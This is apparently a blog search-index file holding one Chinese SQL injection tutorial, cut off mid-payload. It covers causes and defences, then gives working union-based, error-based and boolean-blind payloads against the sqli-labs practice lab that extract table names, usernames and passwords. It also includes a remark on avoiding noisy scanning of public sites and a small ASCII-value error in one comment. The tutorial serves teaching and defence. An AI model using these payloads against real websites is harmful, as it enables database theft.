<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/07/23/sql-zhu-ru/"/>
      <url>/2023/07/23/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p><a name="Lha6Q"></a></p><h1 id="·前言"><a href="#·前言" class="headerlink" title="·前言"></a>·前言</h1><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。<br /><a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）<strong>。</strong><br /><strong>即：注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询</strong><br />在学习sql注入前，我们需要了解sql语句的基本语法 ——&gt; <a href="https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163875545216780269895046%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163875545216780269895046&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-114327303.pc_v2_rank_blog_default&utm_term=mysql&spm=1018.2226.3001.4450">mysql基础学习</a><br><a name="I05lS"></a></p><h2 id="一、漏洞原因分析"><a href="#一、漏洞原因分析" class="headerlink" title="一、漏洞原因分析"></a>一、漏洞原因分析</h2><p>我们都知道web分为前端和后端，前端负责进行展示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询<br />我们可以举一个例子，以<a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>第一关为例，按要求在url后面加上?id&#x3D;1，显示如下<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211046260.png" alt="image-20230724211046260"><br />当我们改变id的值为2是，页面发生了改变。说明它将我们输入的数据代入到了数据中进行查询，页面根据输入数据的不同展示的内容也不同。<br />ps：url中?代表传值的意思，id代表变量，后面的”&#x3D;”代表变量的值<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211059152.png" alt="image-20230724211059152"><br />为了更清楚的看清sql语句的执行与变化过程，我们先修改源代码，打开Less-1&#x2F;index.php，在源码中添加如下语句将执行的sql语句打印出来，方便我们查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;执行的sql语句为：&#x27;.$sql;</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211116282.png" alt="image-20230724211116282"><br />访问页面如下，打印出了执行的sql语句<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211127500.png" alt="image-20230724211127500"><br />在1后面加上单引号, ?id&#x3D;1’，页面显示有语法错误，说靠近 ‘1’’ limit 0,1有语法错误，我们输入的数据 1’ 被完整的带入到了SQL语句中，即直接与原有的sql语句进行了拼接。然后执行的sql语句变成了<br />$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’  1 ‘ ‘ LIMIT 0,1”;<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211151225.png" alt="image-20230724211151225"><br />我们输入的那个单引号和前面的单引号产生了闭合，导致原有后面的那个单引号变成了多余，而sql语法中引号是必须成对出现的否则就会报错。<br />既然输入的单引号成了多余也就证明程序没有对我们的输入进行过滤，那我们就构造语句将单引号进行闭合就好了。我们在1后面加上单引号，与前面的引号构成闭合，再接着在后面插入我们自己想要查询的语句就可以查询我们想要查询的数据，就这样被脱库的风险就悄悄的发生。<br><a name="R90vq"></a></p><h2 id="二、漏洞危害"><a href="#二、漏洞危害" class="headerlink" title="二、漏洞危害"></a><strong>二、漏洞危害</strong></h2><p>SQL注入漏洞对于数据安全的影响：</p><ul><li><strong>数据库信息泄漏：</strong>数据库中存放的用户的隐私信息的泄露。</li><li><strong>网页篡改：</strong>通过操作数据库对特定网页进行篡改。</li><li><strong>网站被挂马，传播恶意软件：</strong>修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li><strong>数据库被恶意操作：</strong>数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li><strong>服务器被远程控制，被安装后门：</strong>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li><strong>破坏硬盘数据，瘫痪全系统。</strong><br><a name="fRPZt"></a></li></ul><h2 id="三、sql注入防范"><a href="#三、sql注入防范" class="headerlink" title="三、sql注入防范"></a><strong>三、sql注入防范</strong></h2><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：<br />代码层面：</p><ol><li>对输入进行严格的转义和过滤</li><li>使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了”拼接”的方式,所以使用时需要慎重!</li><li>PDO预处理 (Java、PHP防范推荐方法：)</li></ol><p>⛔没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入<br />网络层面：</p><ol><li>通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</li><li>云端防护（如阿里云盾）<br><a name="zet9G"></a></li></ol><h2 id="四、如何挖掘sql注入漏洞"><a href="#四、如何挖掘sql注入漏洞" class="headerlink" title="四、如何挖掘sql注入漏洞"></a>四、如何挖掘sql注入漏洞</h2><p><em><strong>1. 注入可能存在的地方</strong></em><br />竟然是sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id&#x3D;1<br />如我们看见这种就可以考虑<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211151225.png"><br />或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232630117.png" alt="image-20230724232630117"><br />或者是HTTP请求头部字段如Cookie值，下面会讲到。<br /><em><strong>2. 漏洞探测</strong></em><br />此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#判断如下闭合方式是否会报错，会报错则肯定存在注入</span><br><span class="line"></span><br><span class="line">=test&#x27;                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=test&quot;                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞</span><br><span class="line"></span><br><span class="line">=test&#x27; and -1=-1 or &#x27;</span><br><span class="line"></span><br><span class="line">=test&#x27; and -1=-2 or &#x27;  </span><br><span class="line"></span><br><span class="line">=test&quot; and -1=-1 or &quot;</span><br><span class="line"></span><br><span class="line">=test&quot; and -1=-2 or &quot;</span><br></pre></td></tr></table></figure><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232719155.png" alt="image-20230724232719155"><br />ps：目前网站的sql注入基本都能通过漏洞扫描器xray检测出来 ——&gt; <a href="https://blog.csdn.net/qq_44159028/article/details/114954341?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163876029516780261918664%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163876029516780261918664&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-114954341.pc_v2_rank_blog_default&utm_term=xray&spm=1018.2226.3001.4450">xray与burp联动</a>，但是这样动静太大（公网上），如果在内网中可以直接挂上xray进行检测。所以在公网时可以手动检测是否存在漏洞，然后在存在漏洞的地方打上*，接着复制整个请求包在txt文档中用sqlmap -r进行注入 ——&gt; <a href="https://chenchena.blog.csdn.net/article/details/118566645">sqlmap -r</a><br />补充：<br /><em>get型</em><br />1. 进行url编码<br />在url中进行测试payload需要先进行url编码<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232730792.png" alt="image-20230724232730792"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232742620.png" alt="image-20230724232742620"><br />不进行编码的话，也可以用+代替空格，#代替–+ 。 %23代表#，也是注释符<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232754505.png" alt="image-20230724232754505"><br /><em>post型</em><br />如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232808867.png" alt="image-20230724232808867"><br><a name="jEqBO"></a></p><h2 id="五、常见的注入手法"><a href="#五、常见的注入手法" class="headerlink" title="五、常见的注入手法"></a>五、常见的注入手法</h2><p>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。<br /><em><strong>参数类型分类</strong></em><br />1. 数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br />如 <a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id&#x3D;3<br />2. 字符型：字符型注入正好相反<br />当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹<br />例如数字型语句：select * from table where id &#x3D;3<br />则字符型如下：select * from table where name&#x3D;’admin’<br /><strong><em>注入手法分类</em></strong><br />@   UNION query SQL injection（联合查询注入）<br />@   Error-based SQL injection（错型注入）<br />@   Boolean-based blind SQL injection（基于布尔的盲注）<br />@   Time-based blind SQL injection（基于时间的盲注）<br />@   Stacked queries SQL injection（可多语句查询注入）<br />为了练习sql注入，我们使用sqli-labs靶场进行sql注入学习，网上有很多安装教程这里就不演示了。建议学这个之前先学习mysql语法，不然理解不了sql语句<br><a name="CMMWJ"></a></p><h3 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h3><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 ，<br />漏洞靶场实战，传送门 -》<a href="https://blog.csdn.net/qq_44159028/article/details/115969983">webug 4.0 第一关 显错注入</a><br />我们以sqli-labs第一关为例来学习联合查询。如下，要求我们传入一个id值过去<br />传参?id&#x3D;1<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232920974.png" alt="image-20230724232920974"><br /><em>1. 页面观察</em><br />当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了<br /><em>2. 注入点判断</em><br />开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232932165.png" alt="image-20230724232932165"><br />继续判断 <br />?id&#x3D;1’ and 1&#x3D;1 –+   页面正常显示   传送门 -》<a href="https://blog.csdn.net/qq_44159028/article/details/114808681">关于sql注入中的 –+</a><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232941792.png" alt="image-20230724232941792"><br />?id&#x3D;1’ and 1&#x3D;2 –+  页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232959963.png" alt="image-20230724232959963"><br /><em>3. 判断当前表的字段个数</em><br />?id&#x3D;1 order by 3 –+   <br />传送门 -》<a href="https://blog.csdn.net/qq_44159028/article/details/114809458">关于order by</a><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233013392.png" alt="image-20230724233013392"><br />?id&#x3D;1 order by 4 –+ ,此时显示未知的列，说明此时当前表中只有3列<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233024386.png" alt="image-20230724233024386"><br /><em>4. 判断显示位</em><br />上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br />?id&#x3D;-1’ union select 1,2,3 –+ <br />让union select前面的参数查不出来，所以id&#x3D;-1’<br />如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233037959.png" alt="image-20230724233037959"><br /><em>5. 爆数据库名字</em><br />?id&#x3D;-1’ union select 1,database(),3 –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233053335.png" alt="image-20230724233053335"><br /><em>6. 爆数据库中的表</em><br />?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+<br />其中爆出来数据库中存在三个表<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233109355.png" alt="image-20230724233109355"><br /><em>7. 爆表中的字段</em><br />我们这里选择一个表，users进行进一步的获取表中的字段值<br />?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ –+<br />获取到三个字段，分别为id,username,password<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233122020.png" alt="image-20230724233122020"><br /><em>8. 爆相应字段的所有数据</em><br />?id&#x3D;-1’ union select 1,group_concat(id,’–’,username,’–’,password),3 from users –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233133822.png" alt="image-20230724233133822"><br />至此，一次完整的脱库过程结束了，联合查询也就结束了。<br><a name="jS4kM"></a></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。<br />报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。<br />推荐三种报错注入的方法，直接套用就行。以less-1为例子<br /><strong>1. group by 重复键冲</strong><br />and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()<em>2))x from information_schema.tables group by x)a) –+<br />提交如下，获取数据库名字<br />?id&#x3D;1’ and (select 1 from (select count(</em>),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233144750.png" alt="image-20230724233144750"><br /><strong>2. extractvalue() 函数</strong><br />?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+<br />提交 ?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+  获取数据库名字<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233155563.png" alt="image-20230724233155563"><br /><strong>3. updatexml() 函数</strong><br />and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)<br />1. 提交如下，获取数据库名字<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233213195.png" alt="image-20230724233213195"><br />2. 获取当前数据库中表的名字<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233234039.png" alt="image-20230724233234039"><br />这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233244602.png" alt="image-20230724233244602"><br />如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users<br />3. 爆表中的字段<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233256018.png" alt="image-20230724233256018"><br />总共爆出的字段为： id , username , password<br />4. 爆字段中的内容<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+<br />三组用户名和密码。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233307728.png" alt="image-20230724233307728"><br><a name="Npwye"></a></p><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例<br />1. 我们输入正确的id，显示You are in …..<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233322820.png" alt="image-20230724233322820"><br />我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233334362.png" alt="image-20230724233334362"><br />源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;You are in...........&#x27;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">    echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">    ｝</span><br></pre></td></tr></table></figure><p>所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233424663.png" alt="image-20230724233424663"><br />1. 判断数据库类型</p><ul><li>MySQL数据库表      information_schema.tables</li><li>access                     msysobjects </li><li>SQLServer               sysobjects</li></ul><p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//判断是否是 access数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233452099.png" alt="image-20230724233452099"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233503521.png" alt="image-20230724233503521"><br />所以当前数据库为mysql数据库<br />2. 判断当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"></span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line"></span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line"></span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure><ol start="3"><li>判断当前库的表名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line"></span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line"></span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"></span><br><span class="line">2：判断每个表的长度</span><br><span class="line"></span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line"></span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line"></span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure><ol start="4"><li>判断表的字段</li></ol><ul><li>判断字段个数</li><li>判断每个字段的长度</li><li>猜每个字段的字符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line"></span><br><span class="line">1：判断表中字段的个数</span><br><span class="line"></span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"></span><br><span class="line">2：判断每个字段的长度</span><br><span class="line"></span><br><span class="line">//判断第一个字段的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where 